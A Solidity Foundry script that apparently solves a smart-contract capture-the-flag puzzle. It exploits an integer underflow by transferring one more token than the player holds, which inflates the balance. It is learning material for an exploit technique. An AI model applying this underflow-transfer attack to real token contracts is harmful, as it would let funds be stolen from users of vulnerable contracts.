// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {IToken} from "@puzzles/5/IToken.sol";

contract TokenSolution is Script {
    function run(address target) public {
        solve(target, msg.sender);
    }

    function solve(address target, address player) public {
        IToken puzzleContract = IToken(target);
        uint256 balance = puzzleContract.balanceOf(player);
        uint256 overflowValue = balance + 1;

        vm.startBroadcast();
        puzzleContract.transfer(target, overflowValue);
        vm.stopBroadcast();
    }
}
